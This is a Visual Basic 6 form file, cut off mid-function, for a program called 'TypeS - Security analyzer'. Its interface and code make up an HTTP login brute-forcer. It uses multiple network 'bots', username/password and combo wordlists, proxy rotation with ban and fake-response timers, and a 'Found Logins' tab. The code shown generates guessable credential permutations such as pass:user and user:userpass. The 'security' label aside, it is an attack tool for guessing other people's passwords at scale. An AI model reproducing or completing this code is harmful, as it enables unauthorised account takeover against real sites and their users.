VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{38911DA0-E448-11D0-84A3-00DD01104159}#1.1#0"; "COMCT332.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{284D41E0-6E12-44F5-A453-AD835D80D378}#1.0#0"; "TrayIcon.ocx"
Begin VB.Form frmMain 
   Caption         =   "TypeS - Security analyzer"
   ClientHeight    =   7665
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   8055
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   Picture         =   "frmMain.frx":1042
   ScaleHeight     =   7665
   ScaleWidth      =   8055
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer tmrProxySpeed 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   3360
      Top             =   6120
   End
   Begin VB.Timer tmrProxy 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   2880
      Top             =   6120
   End
   Begin MSWinsockLib.Winsock Proxy 
      Left            =   480
      Top             =   6600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cd1 
      Left            =   1800
      Top             =   3600
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin TrayIcon.fbTrayIcon Tray1 
      Height          =   1155
      Left            =   6480
      TabIndex        =   21
      Top             =   6120
      Visible         =   0   'False
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   2037
   End
   Begin VB.Timer tmrBanned 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   2400
      Top             =   6120
   End
   Begin VB.Timer tmrFakes 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   1920
      Top             =   6120
   End
   Begin VB.Timer tmrSplash 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   1440
      Top             =   6120
   End
   Begin VB.Timer tmrHPS 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   960
      Top             =   6120
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   1200
      Top             =   3600
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   1
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":1A49
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ImageList imgToolbar1 
      Left            =   0
      Top             =   3600
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   9
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":1B2B
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":1EC5
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":76B7
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":A3C1
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":FBB3
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":153A5
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":1BC07
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":21969
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":2715B
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.Timer tmrPercent 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   480
      Top             =   6120
   End
   Begin MSComctlLib.ImageList imgTab 
      Left            =   600
      Top             =   3600
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   2
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":2CF81
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":32773
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.Timer tmrBot 
      Enabled         =   0   'False
      Index           =   0
      Interval        =   3000
      Left            =   0
      Top             =   6120
   End
   Begin MSWinsockLib.Winsock HTTPbot 
      Index           =   0
      Left            =   0
      Top             =   6600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.ProgressBar pb1 
      Height          =   195
      Left            =   3750
      TabIndex        =   3
      Top             =   6105
      Width           =   2445
      _ExtentX        =   4313
      _ExtentY        =   344
      _Version        =   393216
      Appearance      =   0
   End
   Begin MSComctlLib.StatusBar StatusBar1 
      Align           =   2  'Align Bottom
      Height          =   255
      Left            =   0
      TabIndex        =   2
      Top             =   7410
      Width           =   8055
      _ExtentX        =   14208
      _ExtentY        =   450
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   3
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            AutoSize        =   1
            Object.Width           =   6456
         EndProperty
         BeginProperty Panel2 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Object.Width           =   4480
            MinWidth        =   4480
         EndProperty
         BeginProperty Panel3 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Object.Width           =   2717
            MinWidth        =   2717
         EndProperty
      EndProperty
   End
   Begin ComCtl3.CoolBar CoolBar1 
      Align           =   1  'Align Top
      Height          =   600
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   8055
      _ExtentX        =   14208
      _ExtentY        =   1058
      BandCount       =   2
      _CBWidth        =   8055
      _CBHeight       =   600
      _Version        =   "6.7.8988"
      Child1          =   "Toolbar1"
      MinHeight1      =   540
      Width1          =   6030
      NewRow1         =   0   'False
      BandStyle1      =   1
      Caption2        =   "FF:"
      Child2          =   "sdrMove"
      MinWidth2       =   1515
      MinHeight2      =   405
      Width2          =   1935
      NewRow2         =   0   'False
      BandStyle2      =   1
      Begin MSComctlLib.Slider sdrMove 
         Height          =   405
         Left            =   6450
         TabIndex        =   13
         Top             =   90
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   714
         _Version        =   393216
         TickStyle       =   3
      End
      Begin MSComctlLib.Toolbar Toolbar1 
         Height          =   540
         Left            =   30
         TabIndex        =   1
         Top             =   30
         Width           =   6030
         _ExtentX        =   10636
         _ExtentY        =   953
         ButtonWidth     =   1217
         ButtonHeight    =   953
         Style           =   1
         ImageList       =   "imgToolbar1"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   9
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "Session"
               Object.ToolTipText     =   "Start an session..."
               ImageIndex      =   4
               Style           =   5
               BeginProperty ButtonMenus {66833FEC-8583-11D1-B16A-00C0F0283628} 
                  NumButtonMenus  =   3
                  BeginProperty ButtonMenu1 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Key             =   "HTTP"
                     Text            =   "HTTP Session"
                  EndProperty
                  BeginProperty ButtonMenu2 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Text            =   "-"
                  EndProperty
                  BeginProperty ButtonMenu3 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Enabled         =   0   'False
                     Key             =   "Stop"
                     Text            =   "Stop Session!"
                  EndProperty
               EndProperty
            EndProperty
            BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Style           =   3
            EndProperty
            BeginProperty Button3 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "Wordlist"
               Object.ToolTipText     =   "Load wordlist..."
               ImageIndex      =   2
               Style           =   5
               BeginProperty ButtonMenus {66833FEC-8583-11D1-B16A-00C0F0283628} 
                  NumButtonMenus  =   4
                  BeginProperty ButtonMenu1 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Key             =   "combo"
                     Text            =   "Load combo..."
                  EndProperty
                  BeginProperty ButtonMenu2 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Text            =   "-"
                  EndProperty
                  BeginProperty ButtonMenu3 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Key             =   "user"
                     Text            =   "Load usernames..."
                  EndProperty
                  BeginProperty ButtonMenu4 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Key             =   "pass"
                     Text            =   "Load passwords..."
                  EndProperty
               EndProperty
            EndProperty
            BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "Proxies"
               ImageIndex      =   9
               Style           =   5
               BeginProperty ButtonMenus {66833FEC-8583-11D1-B16A-00C0F0283628} 
                  NumButtonMenus  =   2
                  BeginProperty ButtonMenu1 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Key             =   "loadProxies"
                     Text            =   "Load proxies..."
                  EndProperty
                  BeginProperty ButtonMenu2 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Key             =   "validate"
                     Text            =   "Validate"
                  EndProperty
               EndProperty
            EndProperty
            BeginProperty Button5 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "Setup"
               Object.ToolTipText     =   "Setup TypeS..."
               ImageIndex      =   3
            EndProperty
            BeginProperty Button6 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "Tools"
               Object.ToolTipText     =   "Misc. Tools..."
               ImageIndex      =   6
               Style           =   5
               BeginProperty ButtonMenus {66833FEC-8583-11D1-B16A-00C0F0283628} 
                  NumButtonMenus  =   3
                  BeginProperty ButtonMenu1 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Enabled         =   0   'False
                     Key             =   "proxy"
                     Text            =   "Proxy validation"
                  EndProperty
                  BeginProperty ButtonMenu2 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Text            =   "-"
                  EndProperty
                  BeginProperty ButtonMenu3 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                     Key             =   "tray"
                     Text            =   "Send to Tray"
                  EndProperty
               EndProperty
            EndProperty
            BeginProperty Button7 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Style           =   3
            EndProperty
            BeginProperty Button8 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "About"
               Object.ToolTipText     =   "About TypeS..."
               ImageIndex      =   8
            EndProperty
            BeginProperty Button9 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "Exit"
               Object.ToolTipText     =   "Don't leave me!"
               ImageIndex      =   5
            EndProperty
         EndProperty
      End
   End
   Begin VB.PictureBox Picture1 
      BorderStyle     =   0  'None
      Height          =   1455
      Left            =   0
      ScaleHeight     =   1455
      ScaleWidth      =   8055
      TabIndex        =   14
      Top             =   4200
      Visible         =   0   'False
      Width           =   8055
      Begin VB.PictureBox Picture6 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H80000008&
         Height          =   375
         Left            =   0
         ScaleHeight     =   345
         ScaleWidth      =   8025
         TabIndex        =   22
         Top             =   1080
         Width           =   8055
         Begin VB.Label Label4 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Average HPM's: "
            ForeColor       =   &H00FFFFFF&
            Height          =   195
            Left            =   120
            TabIndex        =   24
            Top             =   55
            Width           =   1200
         End
         Begin VB.Label lblHPM 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "0"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   195
            Left            =   1440
            TabIndex        =   23
            Top             =   55
            Width           =   120
         End
      End
      Begin MSComctlLib.ProgressBar pb2 
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   405
         Width           =   7815
         _ExtentX        =   13785
         _ExtentY        =   450
         _Version        =   393216
         Appearance      =   0
      End
      Begin VB.Label Label6 
         AutoSize        =   -1  'True
         Caption         =   "750"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   210
         Left            =   5880
         TabIndex        =   20
         Top             =   720
         Width           =   315
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         Caption         =   "250"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   210
         Left            =   2040
         TabIndex        =   19
         Top             =   720
         Width           =   315
      End
      Begin VB.Line Line7 
         BorderColor     =   &H00808080&
         X1              =   7920
         X2              =   7920
         Y1              =   120
         Y2              =   360
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00808080&
         Index           =   5
         X1              =   120
         X2              =   120
         Y1              =   120
         Y2              =   360
      End
      Begin VB.Line Line6 
         BorderColor     =   &H00808080&
         BorderStyle     =   3  'Dot
         X1              =   7920
         X2              =   120
         Y1              =   240
         Y2              =   240
      End
      Begin VB.Line Line5 
         BorderColor     =   &H00808080&
         X1              =   4080
         X2              =   4080
         Y1              =   120
         Y2              =   360
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00808080&
         Index           =   4
         X1              =   2160
         X2              =   2160
         Y1              =   120
         Y2              =   360
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00808080&
         Index           =   3
         X1              =   6000
         X2              =   6000
         Y1              =   120
         Y2              =   360
      End
      Begin VB.Label Label5 
         Caption         =   "500"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   210
         Left            =   3960
         TabIndex        =   18
         Top             =   720
         Width           =   315
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         Caption         =   "1000"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   210
         Left            =   7560
         TabIndex        =   17
         Top             =   720
         Width           =   420
      End
      Begin VB.Label Label1 
         AutoSize        =   -1  'True
         Caption         =   "00"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   210
         Left            =   120
         TabIndex        =   16
         Top             =   720
         Width           =   210
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00808080&
         BorderStyle     =   3  'Dot
         X1              =   7920
         X2              =   120
         Y1              =   840
         Y2              =   840
      End
   End
   Begin VB.PictureBox Picture5 
      BorderStyle     =   0  'None
      Height          =   1475
      Left            =   0
      ScaleHeight     =   1470
      ScaleWidth      =   8055
      TabIndex        =   11
      Top             =   4200
      Visible         =   0   'False
      Width           =   8055
      Begin MSComctlLib.ListView lvHistory 
         Height          =   1455
         Left            =   0
         TabIndex        =   12
         Top             =   0
         Width           =   8055
         _ExtentX        =   14208
         _ExtentY        =   2566
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         HideColumnHeaders=   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   -2147483640
         BackColor       =   14737632
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   2
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Address:"
            Object.Width           =   10407
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Type:"
            Object.Width           =   3598
         EndProperty
      End
      Begin VB.Line Line11 
         BorderColor     =   &H00FFFFFF&
         X1              =   0
         X2              =   8040
         Y1              =   375
         Y2              =   375
      End
      Begin VB.Line Line10 
         BorderColor     =   &H00808080&
         X1              =   0
         X2              =   8040
         Y1              =   360
         Y2              =   360
      End
   End
   Begin VB.PictureBox Picture2 
      BorderStyle     =   0  'None
      Height          =   1480
      Left            =   0
      ScaleHeight     =   1485
      ScaleWidth      =   8055
      TabIndex        =   5
      Top             =   4200
      Width           =   8055
      Begin RichTextLib.RichTextBox Output 
         Height          =   1440
         Left            =   0
         TabIndex        =   6
         Top             =   0
         Width           =   8055
         _ExtentX        =   14208
         _ExtentY        =   2540
         _Version        =   393217
         BackColor       =   0
         ReadOnly        =   -1  'True
         ScrollBars      =   2
         TextRTF         =   $"frmMain.frx":37F65
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Courier New"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
   Begin VB.PictureBox Picture4 
      BorderStyle     =   0  'None
      Height          =   1475
      Left            =   0
      ScaleHeight     =   1470
      ScaleWidth      =   8055
      TabIndex        =   9
      Top             =   4200
      Visible         =   0   'False
      Width           =   8055
      Begin VB.TextBox txtLogins 
         BackColor       =   &H00E0E0E0&
         Height          =   1455
         Left            =   0
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   10
         Top             =   0
         Width           =   8055
      End
   End
   Begin VB.PictureBox Picture3 
      BorderStyle     =   0  'None
      Height          =   1475
      Left            =   0
      ScaleHeight     =   1470
      ScaleWidth      =   8055
      TabIndex        =   7
      Top             =   4200
      Visible         =   0   'False
      Width           =   8055
      Begin MSComctlLib.ListView lvStatus 
         Height          =   1455
         Left            =   0
         TabIndex        =   8
         Top             =   0
         Width           =   8055
         _ExtentX        =   14208
         _ExtentY        =   2566
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         HideColumnHeaders=   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   -2147483640
         BackColor       =   14737632
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   2
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "col1"
            Object.Width           =   7022
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "col2"
            Object.Width           =   7057
         EndProperty
      End
   End
   Begin MSComctlLib.TabStrip TabStrip1 
      Height          =   1815
      Left            =   0
      TabIndex        =   4
      Top             =   4200
      Width           =   8055
      _ExtentX        =   14208
      _ExtentY        =   3201
      Style           =   2
      TabFixedWidth   =   2593
      HotTracking     =   -1  'True
      Placement       =   1
      Separators      =   -1  'True
      TabMinWidth     =   1059
      _Version        =   393216
      BeginProperty Tabs {1EFB6598-857C-11D1-B16A-00C0F0283628} 
         NumTabs         =   5
         BeginProperty Tab1 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
            Caption         =   "Status"
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab2 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
            Caption         =   "Session Stats."
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab3 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
            Caption         =   "Found Logins"
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab4 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
            Caption         =   "History"
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab5 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
            Caption         =   "Performance"
            ImageVarType    =   2
         EndProperty
      EndProperty
   End
   Begin VB.PictureBox Picture8 
      BorderStyle     =   0  'None
      Height          =   3135
      Left            =   240
      ScaleHeight     =   3135
      ScaleWidth      =   7575
      TabIndex        =   28
      Top             =   1080
      Visible         =   0   'False
      Width           =   7575
      Begin MSComctlLib.ListView lvProxy 
         Height          =   3015
         Left            =   0
         TabIndex        =   29
         Top             =   0
         Width           =   7575
         _ExtentX        =   13361
         _ExtentY        =   5318
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   4
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Proxy Address:"
            Object.Width           =   5362
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Port:"
            Object.Width           =   1834
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "Speed:"
            Object.Width           =   1834
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "Status:"
            Object.Width           =   3598
         EndProperty
      End
      Begin VB.Label Label9 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "[ Proxies not enabled! ]"
         Height          =   195
         Left            =   120
         TabIndex        =   39
         Top             =   240
         Width           =   1620
      End
   End
   Begin VB.PictureBox Picture9 
      BorderStyle     =   0  'None
      Height          =   2895
      Left            =   240
      ScaleHeight     =   2895
      ScaleWidth      =   7575
      TabIndex        =   30
      Top             =   1080
      Visible         =   0   'False
      Width           =   7575
      Begin VB.Frame Frame3 
         Caption         =   "Password:"
         Height          =   1815
         Left            =   3720
         TabIndex        =   36
         Top             =   0
         Width           =   3855
         Begin VB.ListBox lstPasses 
            Height          =   1425
            Left            =   120
            TabIndex        =   37
            Top             =   360
            Width           =   3615
         End
         Begin VB.Label Label7 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Loading..."
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00808080&
            Height          =   195
            Left            =   240
            TabIndex        =   38
            Top             =   1200
            Width           =   870
         End
      End
      Begin VB.Frame Frame2 
         Caption         =   "Username:"
         Height          =   1815
         Left            =   0
         TabIndex        =   33
         Top             =   0
         Width           =   3615
         Begin VB.ListBox lstUsers 
            Height          =   1425
            Left            =   120
            TabIndex        =   34
            Top             =   360
            Width           =   3375
         End
         Begin VB.Label Label8 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Loading..."
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00808080&
            Height          =   195
            Left            =   240
            TabIndex        =   35
            Top             =   1200
            Width           =   870
         End
      End
      Begin VB.Frame Frame1 
         Caption         =   "On The Fly Manipulation"
         Height          =   1095
         Left            =   0
         TabIndex        =   31
         Top             =   1920
         Width           =   7575
         Begin VB.ListBox lstManip 
            Height          =   735
            Left            =   120
            Style           =   1  'Checkbox
            TabIndex        =   32
            Top             =   240
            Width           =   7335
         End
      End
   End
   Begin VB.PictureBox Picture7 
      BorderStyle     =   0  'None
      Height          =   3135
      Left            =   240
      ScaleHeight     =   3135
      ScaleWidth      =   7575
      TabIndex        =   26
      Top             =   1080
      Width           =   7575
      Begin MSComctlLib.ListView lvMain 
         Height          =   3000
         Left            =   0
         TabIndex        =   27
         Top             =   0
         Width           =   7575
         _ExtentX        =   13361
         _ExtentY        =   5292
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         SmallIcons      =   "imgToolbar1"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   3
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Bot:"
            Object.Width           =   1766
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Status"
            Object.Width           =   8362
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            SubItemIndex    =   2
            Text            =   "Login"
            Object.Width           =   2540
         EndProperty
         Picture         =   "frmMain.frx":37FE5
      End
   End
   Begin MSComctlLib.TabStrip TabStrip2 
      Height          =   3495
      Left            =   120
      TabIndex        =   25
      Top             =   720
      Width           =   7815
      _ExtentX        =   13785
      _ExtentY        =   6165
      TabWidthStyle   =   2
      HotTracking     =   -1  'True
      _Version        =   393216
      BeginProperty Tabs {1EFB6598-857C-11D1-B16A-00C0F0283628} 
         NumTabs         =   3
         BeginProperty Tab1 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
            Caption         =   "Bots"
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab2 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
            Caption         =   "Proxies"
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab3 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
            Caption         =   "Wordlist"
            ImageVarType    =   2
         EndProperty
      EndProperty
   End
   Begin VB.Menu mnuFile 
      Caption         =   "File"
      Visible         =   0   'False
      Begin VB.Menu mnuRestore 
         Caption         =   "Restore"
      End
      Begin VB.Menu mnuStop 
         Caption         =   "Stop Scan"
         Enabled         =   0   'False
      End
      Begin VB.Menu mnuExit 
         Caption         =   "Exit TypeS"
      End
   End
   Begin VB.Menu mnuDel 
      Caption         =   "Del"
      Visible         =   0   'False
      Begin VB.Menu mnuDelete 
         Caption         =   "&Delete"
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Written by: Thomas Bishop
'Sorry for not commenting very well :(
'Contact me at: tom@iworld2000.com

'Thanks to Fredrico for the Tray icon control (very nice)
'Thanks to everyone at PSC!!!

Option Explicit

Private intHPS As Long  'Hit's per Minute...
Private proxySPD As Long '(See tmrProxySpeed)

Private Sub DoManip()

    Dim L As Long
    Dim i As Long
    Dim x As Long
    Dim iCOunt As Long
    
    Screen.MousePointer = 11
    iCOunt = 0
    For i = 0 To UBound(strUser)
        ReDim Preserve login(i)
        login(i) = strUser(i) & ":" & strPass(i)
        iCOunt = iCOunt + 1
    Next i
    
    pb1.Value = 0
    pb1.Max = lstManip.ListCount - 1
    For L = 0 To lstManip.ListCount - 1
        pb1.Value = L
        If lstManip.Selected(L) = True Then
            Select Case lstManip.List(L)
                Case "pass:user"
                    
                    logIT "Generating: pass:user", &HFFFF&, Output
                    For i = 0 To UBound(strUser)
                        ReDim Preserve login(iCOunt)
                        login(iCOunt) = strPass(i) & ":" & strUser(i)
                        iCOunt = iCOunt + 1
                    Next i
                    
                Case "user:user"
                    
                    logIT "Generating: user:user", &HFFFF&, Output
                    For i = 0 To UBound(strUser)
                        ReDim Preserve login(iCOunt)
                        login(iCOunt) = strUser(i) & ":" & strUser(i)
                        iCOunt = iCOunt + 1
                    Next i
                    
                Case "pass:pass"
                    
                    logIT "Generating: pass:pass", &HFFFF&, Output
                    For i = 0 To UBound(strUser)
                        ReDim Preserve login(iCOunt)
                        login(iCOunt) = strPass(i) & ":" & strPass(i)
                        iCOunt = iCOunt + 1
                    Next i
                                        
                Case "user:userpass"
                    
                    logIT "Generating: user:userpass", &HFFFF&, Output
                    For i = 0 To UBound(strUser)
                        ReDim Preserve login(iCOunt)
                        login(iCOunt) = strUser(i) & ":" & strUser(i) & strPass(i)
                        iCOunt = iCOunt + 1
                    Next i
                    
                Case "userpass:user"
                    
                    logIT "Generating: userpass:user", &HFFFF&, Output
                    For i = 0 To UBound(strUser)
                        ReDim Preserve login(iCOunt)
